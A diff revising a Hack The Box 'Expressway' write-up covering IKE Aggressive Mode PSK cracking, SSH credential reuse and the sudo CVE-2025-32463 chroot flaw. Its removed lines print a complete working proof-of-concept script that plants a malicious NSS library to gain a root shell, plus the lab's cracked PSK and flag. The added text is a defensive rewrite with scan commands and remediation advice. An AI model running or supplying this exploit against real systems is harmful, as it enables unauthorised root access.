@@ -1,10 +1,9 @@
 ---
 id: HTB-2025-002
 title: Expressway
-excerpt: >-
-  Hack The Box Expressway write-up: IKE aggressive mode enumeration, offline PSK
-  crack, SSH foothold, and sudo privilege escalation.
+excerpt: "IKE Aggressive Mode exposes offline guessing material; credential reuse leads to SSH and an independently vulnerable sudo build."
 date: '2025-09-20'
+updated: "2026-10-13"
 tags:
   - WRITEUP
   - HACKTHEBOX
@@ -23,154 +22,50 @@ icon: Terminal
 author: '0x7CC'
 ---
 
-## TL;DR
-On **Expressway**, the external attack surface is primarily UDP (IPsec/IKE). By enumerating IKE Aggressive Mode, it’s possible to recover material for an **offline PSK crack**, reuse that secret to gain an **SSH foothold** as user `ike`, then escalate to root due to a vulnerable **sudo** version affected by **CVE-2025-32463**.
+## Chain and evidence
 
----
+Expressway's existing lab account reports an IKE Aggressive Mode exchange, recovery of a pre-shared key (PSK), reuse as the SSH password for `ike`, and local elevation through CVE-2025-32463. Its useful lesson is the separation of protocol exposure, weak-secret recovery, and credential reuse.
 
-## Target
-- Host: `expressway.htb`
-- IP: `10.129.6.148`
+The original transcript contains neither the complete handshake nor the cracking command. The recovered secret and flag value are omitted; the mechanics below do not replace those missing captures.
 
----
+## Follow the UDP surface
 
-## Recon: UDP scan reveals IPsec gateway
+The recorded hostname is `expressway.htb`; the account lists UDP 500, 4500, and 69. As the [Nmap UDP scanning guide](https://nmap.org/book/scan-methods-udp-scan.html) explains, UDP scanning can produce ambiguous states, so an `open|filtered` result requires a protocol response before identifying a service. The presence of TFTP does not establish a configuration leak.
 
-### UDP top ports
-- UDP/500: ISAKMP (IKE)
-- UDP/4500: NAT-T IKE (often used behind NAT)
-- UDP/69: TFTP (potential config leakage)
+For an authorized diagnostic scan, this illustrative command limits discovery to the recorded ports:
 
-**Conclusion:** This host behaves like a VPN gateway. The intended path is likely IKE/IPsec rather than typical TCP services.
-
----
-
-## IKE enumeration: Aggressive Mode + PSK authentication
-
-### Main Mode
-IKE responds and discloses proposals (3DES/SHA1/modp1024) and vendor IDs including XAUTH.
-
-### Aggressive Mode
-Aggressive Mode is enabled and returns an identity:
-
-- ID type: `ID_USER_FQDN`
-- ID value: `ike@expressway.htb`
-- Auth: `PSK`
-
-**Why this matters:** Aggressive Mode can leak enough data to enable **offline PSK cracking**.
-
----
-
-## Offline PSK cracking
-
-By capturing PSK-crack compatible material from the Aggressive handshake and cracking it with a wordlist, the Pre-Shared Key was recovered:
-
-- PSK: `freakingrockstarontheroad`
-
-This demonstrates a classic weakness of Aggressive Mode when used with PSK and guessable secrets.
-
----
-
-## Foothold: SSH login with recovered secret
-
-Using the recovered secret, SSH access as user `ike` was possible.
-
-### Proof
-- `user.txt`: `e8853c306e81f62d6972f72915751f9f`
-
----
-
-## Local enumeration: linPEAS highlights sudo risk
-
-After landing on the box, I transferred and executed linPEAS to identify privilege escalation vectors.
-
-### Key linPEAS findings
-- `sudo` version: **1.9.17**
-- Presence of a SUID `sudo` binary in an unusual path (`/usr/local/bin/sudo`)
-- Additional suspicious indicators around chroot tooling
-
----
-
-## Privilege escalation: sudo vulnerability (CVE-2025-32463)
-
-The installed `sudo` version falls within a vulnerable range associated with **CVE-2025-32463**, a local privilege escalation issue in sudo’s chroot-related behavior.
-
-### Result
-Privilege escalation to root was achieved by leveraging this sudo weakness.
-
-```exploit.sh
-#!/bin/bash
-# sudo-chwoot.sh
-# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
-#                  @ Stratascale Cyber Research Unit (CRU)
-STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
-cd ${STAGE?} || exit 1
-
-if [ $# -eq 0 ]; then
-    # If no command is provided, default to an interactive root shell.
-    CMD="/bin/bash"
-else
-    # Otherwise, use the provided arguments as the command to execute.
-    CMD="$@"
-fi
-
-# Escape the command to safely include it in a C string literal.
-# This handles backslashes and double quotes.
-CMD_C_ESCAPED=$(printf '%s' "$CMD" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g')
-
-cat > woot1337.c<<EOF
-#include <stdlib.h>
-#include <unistd.h>
-
-__attribute__((constructor)) void woot(void) {
-  setreuid(0,0);
-  setregid(0,0);
-  chdir("/");
-  execl("/bin/sh", "sh", "-c", "${CMD_C_ESCAPED}", NULL);
-}
-EOF
-
-mkdir -p woot/etc libnss_
-echo "passwd: /woot1337" > woot/etc/nsswitch.conf
-cp /etc/group woot/etc
-gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c
-
-echo "woot!"
-sudo -R woot woot
-rm -rf ${STAGE?}
+```bash
+sudo nmap -sU -sV -p 500,4500,69 expressway.htb
 ```
 
----
+It requests UDP service identification; it does not authenticate to the VPN or recover a secret. Record the responding protocol and scan conditions instead of treating all UDP silence as confirmation.
 
-## Defensive notes / remediation
+## Aggressive Mode and the offline test
 
-### Fix
-- Update sudo to a patched version (vendor packages typically ship a fix in **1.9.17p1+** or later).
-- Avoid maintaining custom SUID sudo builds under `/usr/local/bin` without strict patch management.
+The account reports identity `ike@expressway.htb` with PSK authentication. IKEv1 Aggressive Mode exchanges allow capture of values against which password guesses can be checked offline. The protocol construction is described in [RFC 2409](https://www.rfc-editor.org/rfc/rfc2409.html). An identity string can guide account discovery; it is not an SSH credential.
 
-### Monitoring / detection ideas
-- Watch for `sudo` usage that includes chroot behavior (policy / audit logs).
-- Audit systems for:
-  - Multiple `sudo` binaries present (especially SUID in `/usr/local/bin`)
-  - unexpected NSS configuration changes in temporary directories
-  - unusual library load paths during privileged execution
+Offline recovery still depends on the PSK's resistance to guessing and a correctly captured exchange. The account reports that the recovered PSK also authenticated the `ike` SSH account. That reuse is an additional configuration weakness: recovering a VPN PSK does not inherently grant SSH access.
 
----
+## Identify the sudo actually executed
 
-## Lessons learned
-- When TCP is quiet, **UDP services** (IKE/IPsec) can be the real entry point.
-- IKE **Aggressive Mode + PSK** is a high-risk combination; it enables offline cracking.
-- Post-foothold, automation like **linPEAS** is excellent for quickly surfacing real misconfigurations and version-based risks.
-- Sudo vulnerabilities can be catastrophic when combined with weak operational hygiene (custom installs, delayed patching).
+After SSH access, the account records sudo 1.9.17 and a SUID binary under `/usr/local/bin`. These illustrative local checks distinguish the custom binary from the package-managed one:
 
----
+```bash
+command -v sudo
+/usr/local/bin/sudo --version
+ls -l /usr/local/bin/sudo
+```
 
-## Appendix: Timeline summary
-1. UDP scan → identify IPsec (500/udp) and NAT-T (4500/udp)
-2. IKE enumeration → Aggressive Mode returns ID `ike@expressway.htb`
-3. Capture + offline crack → recover PSK `freakingrockstarontheroad`
-4. SSH as `ike` → obtain user flag
-5. linPEAS → identify vulnerable sudo version
-6. PrivEsc → root access via CVE-2025-32463
+They identify resolution, reported version, and permissions. They do not show whether a distribution backport is present or prove an exploit succeeded.
 
----
+CVE-2025-32463 involves sudo using attacker-controlled NSS configuration during chroot handling. The original research identifies affected upstream versions 1.9.14–1.9.17 and the fix in 1.9.17p1. The path does not require a sudoers rule granting the user a command. See [Stratascale's disclosure](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).
+
+The existing account reports root execution, but the pasted exploit does not explicitly select the custom binary. This revision removes that ambiguous script and retains the need to establish the exact vulnerable executable, architecture, and environment.
+
+## Remediation and closure
+
+Migrate away from IKEv1 Aggressive Mode where feasible, use strong independent credentials, and rotate the recovered PSK and reused password. Verify the legacy exchange is unavailable and that old credentials fail while approved VPN and SSH access still works.
+
+Install the supported sudo security update and inventory every privileged copy, including `/usr/local/bin`. For custom builds, use a fixed upstream release or retire the build. Verify resolution and package provenance after the update; upgrading `/usr/bin/sudo` does not repair a separate SUID copy.
+
+Monitor repeated IKE negotiations, SSH access associated with VPN identities, and privileged execution involving unusual chroot paths. Offline guessing does not produce a stream of online login failures, so that telemetry cannot measure whether a captured PSK was recovered.
